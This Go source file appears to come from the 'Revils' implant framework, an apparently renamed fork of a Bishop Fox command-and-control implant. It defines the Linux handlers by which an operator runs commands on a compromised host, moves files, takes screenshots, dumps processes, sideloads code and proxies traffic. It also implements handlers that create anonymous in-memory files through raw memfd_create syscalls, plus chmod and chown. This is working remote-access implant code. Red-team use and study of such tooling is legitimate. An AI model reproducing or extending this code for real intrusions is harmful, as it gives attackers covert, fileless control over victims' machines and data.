package handlers

/*
	Revils Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/Kevin-kitnick/revils/implant/revils/taskrunner"
	"github.com/Kevin-kitnick/revils/protobuf/commonpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"
	"google.golang.org/protobuf/proto"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		revilspb.MsgPsReq:        psHandler,
		revilspb.MsgTerminateReq: terminateHandler,
		revilspb.MsgPing:         pingHandler,
		revilspb.MsgLsReq:        dirListHandler,
		revilspb.MsgDownloadReq:  downloadHandler,
		revilspb.MsgUploadReq:    uploadHandler,
		revilspb.MsgCdReq:        cdHandler,
		revilspb.MsgPwdReq:       pwdHandler,
		revilspb.MsgRmReq:        rmHandler,
		revilspb.MsgMkdirReq:     mkdirHandler,
		revilspb.MsgMvReq:        mvHandler,
		revilspb.MsgTaskReq:      taskHandler,
		revilspb.MsgIfconfigReq:  ifconfigHandler,
		revilspb.MsgExecuteReq:   executeHandler,
		revilspb.MsgEnvReq:       getEnvHandler,
		revilspb.MsgSetEnvReq:    setEnvHandler,
		revilspb.MsgUnsetEnvReq:  unsetEnvHandler,

		revilspb.MsgScreenshotReq: screenshotHandler,

		revilspb.MsgNetstsatReq:  netstatHandler,
		revilspb.MsgSideloadReq: sideloadHandler,

		revilspb.MsgReconfigureReq: reconfigureHandler,
		revilspb.MsgSSHCommandReq:  runSSHCommandHandler,
		revilspb.MsgProcessDumpReq: dumpHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		revilspb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		revilspb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		revilspb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		revilspb.MsgWGStartSocksReq:     wgStartSocksHandler,
		revilspb.MsgWGStopSocksReq:      wgStopSocksHandler,
		revilspb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}

		// Linux Only
		revilspb.MsgChmodReq:   chmodHandler,
		revilspb.MsgChownReq:   chownHandler,
		revilspb.MsgChtimesReq: chtimesHandler,

		revilspb.MsgMemfilesListReq: memfilesListHandler,
		revilspb.MsgMemfilesAddReq:  memfilesAddHandler,
		revilspb.MsgMemfilesRmReq:   memfilesRmHandler,
	}
)

// GetSystemHandlers - Returns a map of the linux system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}

func getUid(fileInfo os.FileInfo) string {
	uid := int32(fileInfo.Sys().(*syscall.Stat_t).Uid)
	uid_str := strconv.FormatUint(uint64(uid), 10)
	usr, err := user.LookupId(uid_str)
	if err != nil {
		return ""
	}
	return usr.Name
}

func getGid(fileInfo os.FileInfo) string {
	gid := int32(fileInfo.Sys().(*syscall.Stat_t).Gid)
	gid_str := strconv.FormatUint(uint64(gid), 10)
	grp, err := user.LookupGroupId(gid_str)
	if err != nil {
		return ""
	}
	return grp.Name
}

func memfilesListHandler(data []byte, resp RPCResponse) {

	pid := os.Getpid()
	path := fmt.Sprintf("/proc/%d/fd/", pid)
	dir, files, err := getDirList(path)

	// Convert directory listing to protobuf
	timezone, offset := time.Now().Zone()
	dirList := &revilspb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
	if err == nil {
		dirList.Exists = true
	} else {
		dirList.Exists = false
	}
	dirList.Files = []*revilspb.FileInfo{}

	for _, dirEntry := range files {
		//log.Printf("File: %s\n", dirEntry.Name())
		dirEntry.Name()

		fileInfo, err := dirEntry.Info()
		revilsFileInfo := &revilspb.FileInfo{}
		if err == nil {

			revilsFileInfo.Size = fileInfo.Size()
			revilsFileInfo.ModTime = fileInfo.ModTime().Unix()
			revilsFileInfo.Mode = fileInfo.Mode().String()
			// Check if this is a symlink, and if so, add the path the link points to
			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {

				link_str, err := os.Readlink(path + dirEntry.Name())
				if err == nil && strings.Contains(link_str, "/memfd:") {

					revilsFileInfo.Uid = getUid(fileInfo)
					revilsFileInfo.Gid = getGid(fileInfo)
					revilsFileInfo.Name = dirEntry.Name()
					revilsFileInfo.IsDir = dirEntry.IsDir()
					revilsFileInfo.Link = link_str

					dirList.Files = append(dirList.Files, revilsFileInfo)
				}
			}
		}
	}

	// Send back the response
	data, err = proto.Marshal(dirList)
	resp(data, err)

}

func memfilesAddHandler(data []byte, resp RPCResponse) {

	var nrMemfdCreate int
	memfilesAdd := &revilspb.MemfilesAdd{}
	memfilesAdd.Response = &commonpb.Response{}

	memfdName := taskrunner.RandomString(8)
	//memfdName := "/tmp/a"
	memfd, err := syscall.BytePtrFromString(memfdName)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("Error during conversion: %s\n", err)
		//{{end}}
		return
	}
	if runtime.GOARCH == "386" {
		nrMemfdCreate = 356
	} else {
		nrMemfdCreate =
			319
	}

	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
	fd_str := fmt.Sprintf("%d", fd)
	fd_int, err := strconv.ParseInt(fd_str, 0, 64)
	//log.Printf("Fd: %d\n", fd_int)
	memfilesAdd.Fd = fd_int

	data, err = proto.Marshal(memfilesAdd)
	resp(data, err)

}

func memfilesRmHandler(data []byte, resp RPCResponse) {

	memfilesRmReq := &revilspb.MemfilesRmReq{}
	err := proto.Unmarshal(data, memfilesRmReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	memfilesRm := &revilspb.MemfilesRm{}
	memfilesRm.Fd = memfilesRmReq.Fd
	memfilesRm.Response = &commonpb.Response{}

	pid := os.Getpid()
	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, memfilesRmReq.Fd)
	fileInfo, err := os.Lstat(fdPath)

	if err == nil {

		if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
			link_str, err := os.Readlink(fdPath)
			if err == nil && strings.Contains(link_str, "/memfd:") {
				syscall.Close(int(memfilesRmReq.Fd))
			} else {
				memfilesRm.Response.Err = "file descriptor does not represent a memfd"
			}
		} else {
			memfilesRm.Response.Err = "file descriptor does not represent a symlink"
		}
	} else {
		memfilesRm.Response.Err = err.Error()
	}

	data, err = proto.Marshal(memfilesRm)
	resp(data, err)

}

func chmodHandler(data []byte, resp RPCResponse) {
	chmodReq := &revilspb.ChmodReq{}
	err := proto.Unmarshal(data, chmodReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	chmod := &revilspb.Chmod{}
	target, _ := filepath.Abs(chmodReq.Path)
	chmod.Path = target
	// Make sure file exists
	_, err = os.Stat(target)

	chmod.Response = &commonpb.Response{}
	if err == nil {
		// Convert string to octal number
		octal, err := strconv.ParseInt(chmodReq.FileMode, 8, 32)
		if err == nil {

			setuid := octal & 04000
			setgid := octal & 02000
			setstcky := octal & 01000

			// Cast the octal number to fs.FileMode
			fileMode := os.FileMode(octal)

			// Found this was necessary because the constructor above doesn't set special permissions
			if setuid > 0 {
				fileMode = fileMode | os.ModeSetuid
			}
			if setgid > 0 {
				fileMode = fileMode | os.ModeSetgid
			}
			if setstcky > 0 {
				fileMode = fileMode | os.ModeSticky
			}

			if chmodReq.Recursive {

				err := filepath.WalkDir(target, func(file string, d fs.DirEntry, err error) error {
					if err == nil {
						err = os.Chmod(file, fileMode)
						if err != nil {
							return err
						}
					} else {
						return err
					}
					return nil
				})
				if err != nil {
					chmod.Response.Err = err.Error()
				}

			} else {
				err = os.Chmod(target, fileMode)
				if err != nil {
					chmod.Response.Err = err.Error()
				}
			}
		} else {
			chmod.Response.Err = err.Error()
		}
	} else {
		chmod.Response.Err = err.Error()
	}

	data, err = proto.Marshal(chmod)
	resp(data, err)
}

func chownHandler(data []byte, resp RPCResponse) {

	// variable definitions so goto won't break
	var uid_str string
	var gid_str string
	var gid uint64
	var uid uint64
	var err error
	var usr *user.User
	var grp *user.Group

	chownReq := &revilspb.ChownReq{}
	err = proto.Unmarshal(data, chownReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	chown := &revilspb.Chown{}
	target, _ := filepath.Abs(chownReq.Path)
	chown.Path = target
	_, err = os.Stat(target)

	chown.Response = &commonpb.Response{}
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	uid_str = chownReq.Uid
	usr, err = user.Lookup(uid_str)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	uid, err = strconv.ParseUint(usr.Uid, 10, 32)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	gid_str = chownReq.Gid
	grp, err = user.LookupGroup(gid_str)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	gid, err = strconv.ParseUint(grp.Gid, 10, 32)
	if err != nil {
		chown.Response.Err = err.Error()
		goto finished
	}

	// Check if the recursive flag is set and the path is a directory
	if chownReq.Recursive {

		err := filepath.WalkDir(target, func(file string, d fs.DirEntry, err error) error {
			if err == nil {
				err = os.Chown(file, int(uid), int(gid))
				if err != nil {
					return err
				}
			} else {
				return err
			}
			return nil
		})
		if err != nil {
			chown.Response.Err = err.Error()
		}

	} else {

		err = os.Chown(target, int(uid), int(gid))
		if err != nil {
			chown.Response.Err = err.Error()
		}
	}

finished:
	data, err = proto.Marshal(chown)
	resp(data, err)
}
